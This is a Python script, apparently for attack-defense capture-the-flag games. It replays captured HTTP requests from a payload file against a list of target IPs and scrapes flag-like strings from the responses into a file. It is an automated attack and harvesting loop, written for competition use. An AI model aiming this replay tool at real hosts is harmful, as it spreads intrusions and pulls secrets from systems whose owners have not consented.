import re
import sys
import requests
from urllib import parse
f = open(sys.path[0]+'/cap.txt','r')
p = open(sys.path[0]+'/ip.txt','r')
flag=open(sys.path[0]+'/flag.txt','a+')
load=[]
ip=[]
data={}
port=input('目标端口号：')
for target in p.readlines():
    ip.append(target)

for payload in f.readlines():
    lists={}
    payload=payload.replace('\n','').split(' ')
    for x in payload:
        # print(x)
        x = x.split('：')
        # print(x)
        lists[x[0]]=x[1]
    load.append(lists)
# print(load)
for exp in load:
    if exp['Method'] == 'POST':
        for u in ip:
            print(exp['Page'])
            print(exp['Method'] + ':')
            # print(exp['Page'],exp['Data'])
            # print(exp['Data'])
            s=parse.unquote(exp['Data'])
            s=re.split('&',s)
            if s==['']:
                s=exp['Data']
            for k in s:
                d=re.split('=',k)
                data[d[0]]=parse.unquote(d[1])
            print(data)
            try:
                r = requests.post('http://'+ u + ':' + port + exp['Page'],data=data,timeout=5)   
                print(r.status_code)
                print(r.text)
                t=re.sub('\s','',r.text)
                t=re.finditer('(flag{(.*?)})|\{{0,1}[0-9a-zA-Z]{8}-([0-9a-zA-Z]{4}-){3}[0-9a-zA-Z]{12}\}{0,1}',t)
                for g in t:
                    print(g.group())
                    flag.write( u +'：'+g.group() +'\n')
            except:
                print('连接超时')
            # print(data)
            print()
    else:
        for u in ip:
            print(exp['Page'].split('?',1)[0])
            print(exp['Method'] + ':')
            print(exp['Page'].split('?',1)[1:])
            try:
                r=requests.get('http://'+u+':'+port+exp['Page'],timeout=5)
                print(r.status_code)
                print(r.text)
                t=re.sub('\s','',r.text)
                t=re.finditer('(flag{(.*?)})|\{{0,1}[0-9a-zA-Z]{8}-([0-9a-zA-Z]{4}-){3}[0-9a-zA-Z]{12}\}{0,1}',t)
                for g in t:
                    print(g.group())
                    flag.write( u +'：'+g.group()+'\n')
            except:
                print('连接超时')
            print()